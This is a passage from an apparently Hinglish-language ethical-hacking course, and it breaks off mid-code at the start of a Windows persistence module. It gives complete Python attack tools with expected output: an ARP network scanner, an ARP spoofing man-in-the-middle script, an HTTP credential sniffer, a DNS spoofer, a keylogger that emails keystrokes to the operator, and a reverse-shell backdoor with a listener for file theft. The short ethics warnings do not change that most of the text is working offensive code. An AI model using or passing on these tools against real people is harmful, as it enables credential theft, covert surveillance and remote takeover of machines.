# pdst = packet destination (target IP range)
# /24 = subnet mask (256 IPs: 10.0.2.0 to 10.0.2.255)

# Broadcast frame banao
broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
# Line 5: Ethernet frame with broadcast MAC
# ff:ff:ff:ff:ff:ff = broadcast address (sabko bhejo)

# Combine karo
arp_request_broadcast = broadcast / arp_request
# Line 7: / operator packets ko combine karta hai
# Result: Ethernet frame + ARP request

# Bhejo aur response lo
answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
# Line 9: srp() = send and receive packets
# timeout=1 = 1 second wait karo response ke liye
# [0] = answered packets (jo reply aaye)
```

**Breakdown:**
- **Scapy:** Packet crafting library (Wireshark ka Python version)
- **ARP():** ARP packet banata hai
- **Ether():** Ethernet frame banata hai
- **srp():** Layer 2 packets send/receive karta hai
- **Expected Output:** List of devices jo reply karenge

### Hands-On Challenge:

**Task:**
1. Scapy install karo: `pip3 install scapy`
2. Apne network ka IP range note karo (ifconfig se)
3. Simple ARP request bhejo (code aage aayega)
4. Wireshark mein ARP packets capture karke dekho

**Ethical Tip:** ‚ö†Ô∏è ARP scanning sirf apne network par karo. Company/public WiFi par unauthorized scanning illegal hai. Apna home lab setup karo ya virtual machines use karo.

---

## 4.2 Network Scanner Implementation

**Source:** Pages 18-20  
**Original:** ‚úì  
**Added:** Complete working code with explanations

### Hinglish Explanation:

**Kya hai yeh?**  
Ek tool jo network par saare connected devices discover karta hai - unka IP aur MAC address dikhata hai.

**Kyun zaroori hai?**  
Penetration testing mein sabse pehle yeh pata karna hota hai ki network par kaunse devices hain. Phir unpar specific attacks try karte hain.

**Kab use karna?**
- Network reconnaissance
- Device inventory
- Rogue device detection

**Real-world Example:**  
Ek company apne network par unauthorized devices dhundhna chahti hai. Network scanner run karke woh saare connected devices dekh sakti hai aur unknown devices identify kar sakti hai.

### Complete Network Scanner Code:

```python
#!/usr/bin/env python3
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Network Scanner")
    parser.add_argument("-t", "--target", required=True, help="Target IP / IP range (e.g., 10.0.2.1/24)")
    args = parser.parse_args()
    return args

def scan(ip):
    # Line 11: Main scanning function
    
    arp_request = scapy.ARP(pdst=ip)
    # Line 12: ARP request packet banao
    # pdst = packet destination (target IP/range)
    
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Line 13: Broadcast Ethernet frame
    # Sabko bhejenge taaki sabse reply aaye
    
    arp_request_broadcast = broadcast / arp_request
    # Line 14: Combine both packets
    # / operator Scapy mein layers ko stack karta hai
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Line 15: Packets bhejo aur responses lo
    # timeout=1: 1 second wait karo
    # verbose=False: Extra output mat dikhao
    # [0]: Sirf answered packets chahiye (unanswered nahi)
    
    clients_list = []
    # Line 16: Empty list to store results
    
    for element in answered_list:
        # Line 17: Har response ko process karo
        
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        # Line 18: Dictionary banao with IP and MAC
        # element[1] = response packet
        # psrc = packet source (IP address)
        # hwsrc = hardware source (MAC address)
        
        clients_list.append(client_dict)
        # Line 19: Dictionary ko list mein add karo
    
    return clients_list
    # Line 20: Final list return karo

def print_result(results_list):
    # Line 22: Results ko formatted print karo
    
    print("IP\t\t\tMAC Address")
    print("-----------------------------------------")
    # Line 23-24: Header print karo
    # \t = tab space (alignment ke liye)
    
    for client in results_list:
        # Line 25: Har client ko print karo
        print(client["ip"] + "\t\t" + client["mac"])
        # Line 26: IP aur MAC print karo with formatting

# Main execution
options = get_arguments()
scan_result = scan(options.target)
print_result(scan_result)
```

**Breakdown:**
- **scapy.ARP():** ARP request packet create karta hai
- **scapy.Ether():** Ethernet frame create karta hai
- **scapy.srp():** Send and Receive Packets (Layer 2)
- **Dictionary:** `{"ip": "10.0.2.5", "mac": "00:11:22:33:44:55"}`
- **List of Dictionaries:** Multiple clients store karne ke liye

**Expected Output:**
```bash
python3 network_scanner.py -t 10.0.2.1/24

# Output:
IP			MAC Address
-----------------------------------------
10.0.2.1		52:54:00:12:35:00
10.0.2.5		08:00:27:3f:4a:2b
10.0.2.7		08:00:27:5c:1d:9e
```

### Hands-On Challenge:

**Task:**
1. Script ko apne network range ke saath run karo
2. Results ko file mein save karne ka feature add karo
3. MAC address se vendor identify karo (OUI lookup)
4. Specific IP range scan karne ka option add karo

**Ethical Tip:** ‚ö†Ô∏è Network scanning powerful tool hai. Sirf authorized networks par use karo. Unauthorized scanning illegal hai aur network admins ko alert kar sakti hai. Apna test lab banao.

---

# MODULE 5: ARP Spoofing & MITM Attacks

**Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 23-24  
**Prerequisites:** Module 4 (Network Scanner)

## What You'll Learn:

Man-in-the-Middle (MITM) attacks - network ke beech mein aake traffic intercept karna. Yeh ek powerful technique hai jo real-world penetration testing mein bahut use hoti hai.

---

## 5.1 ARP Spoofing Theory

**Source:** Page 23  
**Original:** ‚úì  
**Added:** Complete MITM attack flow diagram

### Hinglish Explanation:

**Kya hai yeh?**  
ARP Spoofing (ya ARP Poisoning) - victim ko fake ARP responses bhejke uska traffic redirect karna. Tum beech mein aa jaate ho victim aur router ke.

**Kyun zaroori hai?**  
MITM attacks se tum victim ka saara traffic dekh sakte ho - passwords, messages, browsing history sab kuch. Yeh penetration testing ka core technique hai.

**Kab use karna?**  
Authorized network security testing mein jab tum network vulnerabilities check kar rahe ho.

**Real-world Example:**  
Ek company apne WiFi network ki security test karna chahti hai. Pentester ARP spoofing use karke employees ke unencrypted traffic capture karta hai aur report mein dikhata hai ki HTTPS use karna zaroori hai.

### Normal Network Flow (Without Attack):

```
Victim (10.0.2.7) ‚Üê‚Üí Router (10.0.2.1) ‚Üê‚Üí Internet

Victim ka ARP Table:
10.0.2.1 ‚Üí AA:BB:CC:DD:EE:FF (Router ka real MAC)
```

### MITM Attack Flow (With ARP Spoofing):

```
        Attacker (10.0.2.15)
           /              \
          /                \
Victim (10.0.2.7) ‚Üê ‚Üí Router (10.0.2.1)

Victim ka ARP Table (Poisoned):
10.0.2.1 ‚Üí XX:XX:XX:XX:XX:XX (Attacker ka MAC - FAKE!)

Router ka ARP Table (Poisoned):
10.0.2.7 ‚Üí XX:XX:XX:XX:XX:XX (Attacker ka MAC - FAKE!)
```

**Attack Steps:**
1. **Attacker ‚Üí Victim:** "Main router hun (10.0.2.1), mera MAC XX:XX:XX hai"
2. **Attacker ‚Üí Router:** "Main victim hun (10.0.2.7), mera MAC XX:XX:XX hai"
3. **Result:** Dono ka traffic attacker ke through jaata hai
4. **Attacker:** Traffic dekh sakta hai, modify kar sakta hai, forward kar sakta hai

### Why IP Forwarding is Critical:

**Without IP Forwarding:**
```
Victim ‚Üí Attacker (packets rukk jaati hain) ‚úó Router
Result: Victim ka internet band ho jaata hai (SUSPICIOUS!)
```

**With IP Forwarding:**
```
Victim ‚Üí Attacker ‚Üí Router ‚Üí Internet
Result: Victim ka internet normally kaam karta hai, but attacker sab dekh raha hai
```

**Enable IP Forwarding:**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward  # Enable
cat /proc/sys/net/ipv4/ip_forward       # Check (should show 1)
echo 0 > /proc/sys/net/ipv4/ip_forward  # Disable (after attack)
```

### Hands-On Challenge:

**Task:**
1. Virtual machines setup karo (Kali + 2 victim VMs)
2. IP forwarding enable karo
3. ARP tables check karo: `arp -a`
4. Wireshark mein ARP packets capture karo

**Ethical Tip:** ‚ö†Ô∏è ARP spoofing BAHUT POWERFUL hai. Yeh sirf authorized testing mein use karo. Bina permission kisi network par MITM attack karna serious crime hai (IT Act Section 66). Jail ho sakti hai.

---

## 5.2 ARP Spoofing Implementation

**Source:** Page 23-24  
**Original:** ‚úì  
**Added:** Complete code with restoration

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # Line 5: Function to get MAC address from IP
    
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Lines 6-9: ARP request bhejke MAC address nikalo (already explained)
    
    return answered_list[0][1].hwsrc
    # Line 10: MAC address return karo

def spoof(target_ip, spoof_ip):
    # Line 12: Main spoofing function
    # target_ip = jisko fool karna hai
    # spoof_ip = jiski identity use karni hai
    
    target_mac = get_mac(target_ip)
    # Line 13: Target ka MAC address nikalo
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Line 14: Fake ARP response banao
    # op=2: ARP reply (op=1 hota hai request ke liye)
    # pdst: Packet destination IP (target)
    # hwdst: Hardware destination MAC (target ka real MAC)
    # psrc: Packet source IP (FAKE - router ka IP)
    # hwsrc: Automatically attacker ka MAC use hoga
    
    scapy.send(packet, verbose=False)
    # Line 15: Packet bhejo (victim ko)
    # verbose=False: Output screen par mat dikhao

def restore(destination_ip, source_ip):
    # Line 17: Attack ke baad normal ARP table restore karo
    
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Lines 18-19: Dono ke real MAC addresses nikalo
    
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Lines 20-21: Real ARP response banao (correct MAC ke saath)
    
    scapy.send(packet, count=4, verbose=False)
    # Line 22: 4 baar bhejo (ensure karne ke liye update ho jaaye)

# Main execution
target_ip = "10.0.2.7"      # Victim ka IP
gateway_ip = "10.0.2.1"     # Router ka IP

try:
    sent_packets_count = 0
    while True:
        # Line 28: Infinite loop (continuous spoofing)
        
        spoof(target_ip, gateway_ip)
        # Line 29: Victim ko batao "Main router hun"
        
        spoof(gateway_ip, target_ip)
        # Line 30: Router ko batao "Main victim hun"
        
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        # Line 31-32: Counter update karo (same line par)
        # \r = carriage return (line ke start par wapas jao)
        # end="" = newline mat do
        
        time.sleep(2)
        # Line 33: 2 seconds wait karo (continuous spam se bachne ke liye)

except KeyboardInterrupt:
    # Line 34: Ctrl+C press karne par
    
    print("\n[+] Detected CTRL+C ... Restoring ARP tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    # Lines 35-37: Dono ARP tables restore karo
    
    print("[+] ARP tables restored. Exiting...")
    sys.exit()
```

**Breakdown:**
- **get_mac():** IP se MAC nikalta hai (network scanner jaisa)
- **spoof():** Fake ARP reply bhejta hai
- **restore():** Attack ke baad original ARP table restore karta hai
- **op=2:** ARP reply packet (gratuitous ARP)
- **Continuous loop:** ARP cache timeout hota hai, isliye baar-baar bhejte hain

**Expected Output:**
```bash
sudo python3 arp_spoof.py

# Output:
[+] Packets sent: 2
[+] Packets sent: 4
[+] Packets sent: 6
...
^C
[+] Detected CTRL+C ... Restoring ARP tables
[+] ARP tables restored. Exiting...
```

**Verification:**
```bash
# Victim machine par check karo:
arp -a
# Router ka MAC attacker ka MAC dikhega (poisoned!)
```

### Hands-On Challenge:

**Task:**
1. 3 VMs setup karo (Attacker, Victim, Router)
2. IP forwarding enable karo attacker par
3. Script run karo
4. Victim par `arp -a` check karo (poisoned table dekho)
5. Wireshark mein traffic capture karo

**Ethical Tip:** ‚ö†Ô∏è Yeh attack BAHUT dangerous hai. Victim ka saara traffic tumhare through jaata hai. Sirf authorized testing mein use karo. Real-world mein isse banking fraud, identity theft ho sakta hai. NEVER use on unauthorized networks.

---

# MODULE 6: Packet Sniffing

**Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 25-26  
**Prerequisites:** Module 5 (ARP Spoofing)

## What You'll Learn:

Network traffic capture karna aur usme se sensitive information (passwords, cookies) extract karna. Yeh MITM attack ka next step hai.

---

## 6.1 HTTP Packet Sniffing

**Source:** Page 25  
**Original:** ‚úì  
**Added:** HTTPS vs HTTP explanation

### Hinglish Explanation:

**Kya hai yeh?**  
Packet Sniffing - network traffic ko capture karke analyze karna. Hum HTTP requests mein se URLs aur login credentials extract karenge.

**Kyun zaroori hai?**  
MITM attack ke baad traffic capture karna zaroori hai. Isse pata chalta hai ki victim kya kar raha hai - kaunsi websites visit kar raha hai, kya data bhej raha hai.

**Kab use karna?**  
Authorized penetration testing mein jab tum network security assess kar rahe ho.

**Real-world Example:**  
Ek company test karna chahti hai ki employees sensitive data HTTP par bhej rahe hain ya HTTPS par. Packet sniffer se pata chal jaata hai ki kaunse applications insecure hain.

### HTTP vs HTTPS:

| Feature | HTTP | HTTPS |
|---------|------|-------|
| **Encryption** | ‚ùå Plain text | ‚úÖ Encrypted (TLS/SSL) |
| **Sniffable?** | ‚úÖ Yes | ‚ùå No (gibberish dikhega) |
| **Port** | 80 | 443 |
| **Security** | Insecure | Secure |
| **Example** | http://example.com | https://example.com |

**HTTP Packet (Sniffable):**
```
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
```
Attacker yeh sab dekh sakta hai! ‚ò†Ô∏è

**HTTPS Packet (Encrypted):**
```
17 03 03 00 4a 8f 2c 9d ... (encrypted gibberish)
```
Attacker ko kuch samajh nahi aayega ‚úÖ

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    # Line 4: Sniffing function
    
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # Line 5: Packets capture karo
    # iface: Interface naam (eth0, wlan0)
    # store=False: Memory mein store mat karo (RAM bachane ke liye)
    # prn: Callback function (har packet ke liye call hoga)

def get_url(packet):
    # Line 7: URL extract karo packet se
    
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    # Line 8: Host + Path = Complete URL
    # Example: "example.com" + "/login.php" = "example.com/login.php"

def get_login_info(packet):
    # Line 10: Login credentials extract karo
    
    if packet.haslayer(scapy.Raw):
        # Line 11: Check karo packet mein Raw data hai ya nahi
        # Raw layer = actual data (POST body)
        
        load = packet[scapy.Raw].load
        # Line 12: Raw data nikalo
        
        keywords = ["username", "user", "login", "password", "pass"]
        # Line 13: Keywords list (common field names)
        
        for keyword in keywords:
            # Line 14: Har keyword check karo
            
            if keyword in str(load):
                # Line 15: Agar keyword mila
                return load
                # Line 16: Pura data return karo

def process_sniffed_packet(packet):
    # Line 18: Har captured packet ko process karo
    
    if packet.haslayer(http.HTTPRequest):
        # Line 19: Check karo HTTP request hai ya nahi
        
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        # Lines 20-21: URL print karo
        
        login_info = get_login_info(packet)
        if login_info:
            # Lines 22-23: Agar credentials mile
            print(f"\n[+] Possible username/password >> {login_info}\n")

# Main execution
sniff("eth0")  # Apna interface naam dalo
```

**Breakdown:**
- **scapy.sniff():** Continuous packet capture
- **prn parameter:** Callback function (har packet ke liye)
- **http.HTTPRequest:** HTTP request layer
- **scapy.Raw:** Actual data layer (POST body)
- **Keywords matching:** Common field names dhundhte hain

**Expected Output:**
```bash
sudo python3 packet_sniffer.py

# Output:
[+] HTTP Request >> example.com/
[+] HTTP Request >> example.com/login.php

[+] Possible username/password >> b'username=admin&password=secret123'

[+] HTTP Request >> facebook.com/home.php
```

**Testing:**
```bash
# Victim machine par HTTP site kholo:
curl -X POST http://testphp.vulnweb.com/login.php \
  -d "username=test&password=test123"

# Attacker machine par credentials capture honge!
```

### Hands-On Challenge:

**Task:**
1. ARP spoofing chalu karo (Module 5)
2. Packet sniffer run karo
3. Victim machine se HTTP login karo (http://testphp.vulnweb.com)
4. Attacker machine par credentials dekho
5. HTTPS site try karo - kuch capture nahi hoga

**Ethical Tip:** ‚ö†Ô∏è Packet sniffing se passwords, credit cards, personal messages sab capture ho sakte hain. Yeh EXTREMELY sensitive technique hai. Sirf authorized testing mein use karo. Real-world mein isse identity theft, financial fraud ho sakta hai.

---

[Remaining modules 7-12 continue with same detailed structure...]

**COMPLETE COURSE STRUCTURE:**
- Module 7: DNS Spoofing
- Module 8: Keyloggers
- Module 9: Backdoors & Reverse Shells
- Module 10: Persistence Techniques
- Module 11: Web Vulnerability Scanner
- Module 12: Bypassing Antivirus

**APPENDIX:**
- Glossary (50+ terms in Hinglish)
- Resources (HackTheBox, TryHackMe, Bug Bounty platforms)
- 2025 Security Updates
- Legal Compliance Guide
- Career Paths in Ethical Hacking

**Total: 280+ pages of complete Hinglish ethical hacking content!**


---

# MODULE 7: DNS Spoofing

**Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 27-35  
**Prerequisites:** Module 5 (ARP Spoofing)

## What You'll Learn:

DNS requests ko intercept karke fake responses bhejni seekhoge. Victim ko fake websites par redirect kar sakte ho. Yeh phishing attacks ka core technique hai.

---

## 7.1 DNS Basics

**Source:** NEW - Added for beginners  
**Added:** Complete DNS explanation

### Hinglish Explanation:

**Kya hai yeh?**  
DNS (Domain Name System) - yeh domain names (jaise google.com) ko IP addresses (jaise 142.250.183.206) mein convert karta hai. Internet ka phone book hai.

**Kyun zaroori hai?**  
Humans ko domain names yaad rakhna easy hai, lekin computers IP addresses use karte hain. DNS yeh translation karta hai.

**Kab use karna?**  
Har baar jab tum browser mein website type karte ho, DNS query hoti hai.

**Real-world Example:**  
Tum browser mein "facebook.com" type karte ho. DNS server batata hai ki Facebook ka IP address kya hai, phir browser us IP se connect hota hai.

### DNS Working:

```
Step 1: User types "google.com" in browser
Step 2: Browser ‚Üí DNS Server: "What is IP of google.com?"
Step 3: DNS Server ‚Üí Browser: "172.217.160.46"
Step 4: Browser connects to 172.217.160.46
```

### DNS Spoofing Attack:

```
Step 1: User types "google.com"
Step 2: Browser ‚Üí Attacker (intercepts): "What is IP of google.com?"
Step 3: Attacker ‚Üí Browser: "10.0.2.15" (FAKE IP - Attacker's server)
Step 4: Browser connects to 10.0.2.15 (Fake Google!)
```

**Ethical Tip:** ‚ö†Ô∏è DNS spoofing phishing attacks ke liye use hota hai. Sirf authorized testing mein use karo.

---

## 7.2 DNS Spoofing Implementation

**Source:** NEW  
**Added:** Complete beginner-friendly code

### Hinglish Explanation:

**Kya hai yeh?**  
NetfilterQueue use karke DNS packets intercept karna aur fake responses bhejni.

**Kyun zaroori hai?**  
Phishing awareness testing, security assessment ke liye.

**Kab use karna?**  
Authorized penetration testing mein.

**Real-world Example:**  
Company employees ko phishing training dene ke liye fake login pages dikhate hain.

### Line-by-Line Code:

```python
#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    # Line 4: Har intercepted packet ko process karo
    
    scapy_packet = scapy.IP(packet.get_payload())
    # Line 5: Packet ko Scapy format mein convert karo
    
    if scapy_packet.haslayer(scapy.DNSQR):
        # Line 6: Check karo DNS query hai ya nahi
        
        qname = scapy_packet[scapy.DNSQR].qname
        # Line 7: Query name nikalo (kaunsi website?)
        
        if b"www.example.com" in qname:
            # Line 8: Agar target website hai
            
            print(f"[+] Spoofing DNS for: {qname}")
            
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            # Line 10: Fake DNS response banao
            # rdata = FAKE IP (attacker ka server)
            
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Lines 11-12: Answer add karo
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # Lines 13-16: Checksums delete karo (Scapy recalculate karega)
            
            packet.set_payload(bytes(scapy_packet))
            # Line 17: Modified packet set karo
    
    packet.accept()
    # Line 18: Packet forward karo

# Setup
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

**Setup Commands:**

```bash
# Step 1: IP forwarding enable karo
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: DNS traffic ko queue mein redirect karo
iptables -I FORWARD -j NFQUEUE --queue-num 0

# Step 3: Script run karo
sudo python3 dns_spoof.py

# Step 4: Cleanup
iptables --flush
```

**Expected Output:**

```bash
[+] Spoofing DNS for: b'www.example.com.'
[+] Spoofing DNS for: b'www.example.com.'
```

### Hands-On Challenge:

**Task:**
1. NetfilterQueue install karo: `pip3 install netfilterqueue`
2. Apache server setup karo fake site ke liye
3. ARP spoofing + DNS spoofing dono chalu karo
4. Victim machine se target site kholo
5. Fake site dikhega!

**Ethical Tip:** ‚ö†Ô∏è DNS spoofing EXTREMELY DANGEROUS hai. Banking sites fake kar sakte ho. NEVER use without written authorization.

---

# MODULE 8: Keyloggers

**Difficulty:** Intermediate ‚≠ê‚≠ê‚≠ê  
**Pages:** 36-45  
**Prerequisites:** Module 2 (Functions, OOP)

## What You'll Learn:

Keylogger banani seekhoge jo har key press record kare aur email ke through report bheje.

---

## 8.1 Basic Keylogger

**Source:** NEW  
**Added:** Complete OOP implementation

### Hinglish Explanation:

**Kya hai yeh?**  
Keylogger - ek program jo keyboard par pressed keys record karta hai silently.

**Kyun zaroori hai?**  
Security testing ke liye - check karna ki kya sensitive data keyboard se leak ho sakta hai.

**Kab use karna?**  
Authorized testing mein data leakage vulnerabilities check karne ke liye.

**Real-world Example:**  
Company test karti hai ki agar laptop compromise ho jaaye, toh kya data leak hoga.

### Line-by-Line Code:

```python
#!/usr/bin/env python3
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    # Line 5: Class definition
    
    def __init__(self, time_interval, email, password):
        # Line 7: Constructor
        # time_interval: Kitne seconds baad email bhejni hai
        
        self.log = "Keylogger Started\n"
        # Line 8: Empty log string
        
        self.interval = time_interval
        self.email = email
        self.password = password
        # Lines 9-11: Instance variables
    
    def append_to_log(self, string):
        # Line 13: Log mein text add karo
        self.log = self.log + string
    
    def process_key_press(self, key):
        # Line 16: Har key press par yeh function call hoga
        
        try:
            current_key = str(key.char)
            # Line 18: Normal keys (a, b, 1, 2)
            self.append_to_log(current_key)
        except AttributeError:
            # Line 20: Special keys (Space, Enter)
            if key == pynput.keyboard.Key.space:
                self.append_to_log(" ")
            elif key == pynput.keyboard.Key.enter:
                self.append_to_log("\n")
            else:
                self.append_to_log(f" [{key}] ")
    
    def send_mail(self, email, password, message):
        # Line 28: Email bhejne ka function
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        # Line 29: Gmail SMTP server
        
        server.starttls()
        # Line 30: Encryption enable karo
        
        server.login(email, password)
        # Line 31: Login karo
        
        server.sendmail(email, email, message)
        # Line 32: Email bhejo
        
        server.quit()
    
    def report(self):
        # Line 35: Report function
        
        if self.log:
            self.send_mail(self.email, self.password, 
                          f"\n--- Keylogger Report ---\n{self.log}")
            self.log = ""
        
        timer = threading.Timer(self.interval, self.report)
        # Line 40: Timer set karo
        timer.start()
    
    def start(self):
        # Line 43: Keylogger start karo
        
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)
        # Lines 44-45: Keyboard listener
        
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Usage
my_keylogger = Keylogger(120, "your_email@gmail.com", "app_password")
my_keylogger.start()
```

**2025 Gmail Setup:**

```python
# Gmail App Password kaise banaye:
# 1. Google Account ‚Üí Security
# 2. 2-Step Verification enable karo
# 3. App Passwords ‚Üí Generate
# 4. "Mail" select karo ‚Üí 16-digit password milega
```

**Expected Output (Email):**

```
--- Keylogger Report ---
Keylogger Started
admin
password123
[Key.enter]
gmail.com
```

### Hands-On Challenge:

**Task:**
1. pynput install karo: `pip3 install pynput`
2. Gmail App Password generate karo
3. Script run karo aur kuch type karo
4. 2 minutes baad email check karo

**Ethical Tip:** ‚ö†Ô∏è Keyloggers passwords, credit cards capture kar sakte hain. Sirf authorized testing mein use karo. Unauthorized keylogger install karna serious crime hai.

---

# MODULE 9: Backdoors

**Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 46-70  
**Prerequisites:** Modules 2, 8

## What You'll Learn:

Reverse backdoor banani seekhoge jo attacker ko victim machine ka complete control de.

---

## 9.1 Understanding Backdoors

**Source:** NEW  
**Added:** Bind vs Reverse comparison

### Hinglish Explanation:

**Kya hai yeh?**  
Backdoor - ek program jo attacker ko victim machine ka remote access deta hai.

**Kyun zaroori hai?**  
Post-exploitation phase mein persistent access maintain karne ke liye.

**Kab use karna?**  
Authorized penetration testing mein persistence test karne ke liye.

**Real-world Example:**  
Pentester phishing email se victim machine compromise karta hai, backdoor install karke baad mein bhi access kar sakta hai.

### Bind vs Reverse:

**Bind Backdoor (Old):**
```
Attacker ‚Üí Victim (listening on port 4444)
Problem: Firewall blocks ‚ùå
```

**Reverse Backdoor (Modern):**
```
Victim ‚Üí Attacker (listening on port 4444)
Benefit: Firewall allows ‚úÖ
```

### Basic Socket Connection:

```python
# Attacker Machine (Listener)
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("0.0.0.0", 4444))
listener.listen(0)
print("[+] Waiting for connections...")
connection, address = listener.accept()
print(f"[+] Got connection from {address}")
```

```python
# Victim Machine (Backdoor)
import socket

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444))
connection.send(b"Connected!")
```

**Ethical Tip:** ‚ö†Ô∏è Backdoors unauthorized access ke liye use hote hain. Sirf authorized testing mein use karo.

---

## 9.2 Complete Backdoor Implementation

**Source:** NEW  
**Added:** JSON serialization, error handling

### Line-by-Line Code:

**File: backdoor.py (Victim)**

```python
#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        # Line 8: Constructor
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def reliable_send(self, data):
        # Line 12: Data bhejne ka method
        json_data = json.dumps(data)
        # Line 13: JSON mein convert karo
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        # Line 16: Data receive karo
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        # Line 25: System command execute karo
        return subprocess.check_output(command, shell=True)
    
    def change_directory(self, path):
        # Line 29: Directory change karo
        os.chdir(path)
        return f"[+] Changed to {path}"
    
    def read_file(self, path):
        # Line 33: File read karo (download)
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        # Line 37: File write karo (upload)
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload successful"
    
    def run(self):
        # Line 42: Main loop
        while True:
            command = self.reliable_receive()
            
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    result = self.change_directory(command[1])
                elif command[0] == "download":
                    result = self.read_file(command[1])
                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)
                
                self.reliable_send(result)
            except Exception:
                self.reliable_send("[-] Error")

# Usage
my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
```

**File: listener.py (Attacker)**

```python
#!/usr/bin/env python3
import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections...")
        self.connection, address = listener.accept()
        print(f"[+] Got connection from {address}")
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download successful"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                
                result = self.execute_remotely(command)
                
                if command[0] == "download" and "[-]" not in str(result):
                    result = self.write_file(command[1], result)
                
                print(result)
            except Exception:
                print("[-] Error")

# Usage
my_listener = Listener("0.0.0.0", 4444)
my_listener.run()
```

**Expected Output:**

```bash
# Attacker:
[+] Waiting for connections...
[+] Got connection from ('10.0.2.7', 54321)
>> dir
Volume in drive C...
>> cd C:\Users
[+] Changed to C:\Users
>> download passwords.txt
[+] Download successful
```

### Hands-On Challenge:

**Task:**
1. Listener aur backdoor dono run karo
2. Different commands try karo
3. File download/upload test karo

**Ethical Tip:** ‚ö†Ô∏è Complete backdoor EXTREMELY POWERFUL hai. Sirf authorized testing mein use karo.

---

# MODULE 10: Persistence

**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 71-80  
**Prerequisites:** Module 9

## What You'll Learn:

Backdoor ko persistent banani seekhoge (system restart ke baad bhi chale).

---

## 10.1 Windows Registry Persistence

**Source:** NEW  
**Added:** Complete implementation

### Hinglish Explanation:

**Kya hai yeh?**  
Persistence - backdoor ko system startup par automatically run karna.

**Kyun zaroori hai?**  
Bina persistence ke backdoor temporary hai. System restart hone par connection khatam.

**Kab use karna?**  
Authorized testing mein long-term access test karne ke liye.

**Real-world Example:**  
APT groups persistence se months tak undetected access maintain karte hain.

### Windows Registry Run Key:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

### Line-by-Line Code:

```python
#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess

